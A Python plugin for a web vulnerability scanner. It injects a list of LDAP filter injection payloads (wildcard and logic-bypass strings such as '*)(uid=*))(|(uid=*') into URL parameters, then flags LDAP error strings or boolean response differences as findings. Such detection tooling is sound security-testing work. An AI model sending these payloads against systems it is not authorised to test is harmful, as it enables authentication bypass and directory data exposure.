"""
LDAP Injection Detection Plugin v5.0.

Expanded payload coverage including Blind LDAP Injection (boolean-based and time-based).
Uses baseline differential with confidence scoring.
"""

import time
from core.http_client import get, DEFAULT_TIMEOUT
from core.config import ScannerConfig
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding,
)
from core.utils import inject_into_params, get_forms, submit_form

PAYLOADS = [
    # Basic bypass
    "*", "*)(&", "*(|(objectclass=*))", "*)(uid=*))(|(uid=*",
    "admin*", "*)((|", "\\00",
    
    # Advanced logic bypass
    "admin)(&))", "admin)(!(&))",
    "*)(uid=*))(|(uid=*", 
]

LDAP_ERROR_SIGNATURES = [
    "ldap_search", "ldap_bind", "ldap_connect",
    "invalid dn syntax", "ldap error", "bad search filter",
    "javax.naming.directory", "ldapexception",
    "size limit exceeded", "object class violation",
    "directory service is unavailable",
]


def test_ldap_injection(url):
    baseline = get_baseline(url, get)
    findings = []

    # 1. Error-based & Logic Bypass LDAP Injection
    for payload in PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url, timeout=DEFAULT_TIMEOUT)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                # Check for explicit LDAP errors
                for sig in LDAP_ERROR_SIGNATURES:
                    if sig in text_lower and sig not in baseline["text_lower"]:
                        signals["error_string"] = True
                        evidence = sig
                        break

                signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD

                if signals.get("error_string"):
                    confidence = calculate_confidence(signals)
                    if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                        f = make_finding(
                            url, "LDAP Injection (Error-Based)", confidence, signals,
                            details=f"LDAP error '{evidence}' via param '{param}'",
                            severity="High", payload=payload,
                            evidence=evidence, parameter=param,
                        )
                        if f: findings.append(f)
                
                # Check for boolean differences (blind logic bypass)
                elif "objectclass=*" in payload and signals["response_diff"]:
                    # Ensure it wasn't just a generic 500
                    if r.status_code == 200:
                        signals["behavioral_anomaly"] = True
                        confidence = calculate_confidence(signals)
                        if confidence >= ScannerConfig.CONFIDENCE_PROBABLE:
                            f = make_finding(
                                url, "LDAP Injection (Boolean-Based)", confidence, signals,
                                details=f"Response changed significantly with logical true payload via param '{param}'",
                                severity="High", payload=payload,
                                evidence="Response differential indicates boolean success", parameter=param,
                            )
                            if f: findings.append(f)
                            
            except Exception:
                continue

    if not findings:
        return None
    if len(findings) == 1:
        return findings[0]
    return findings
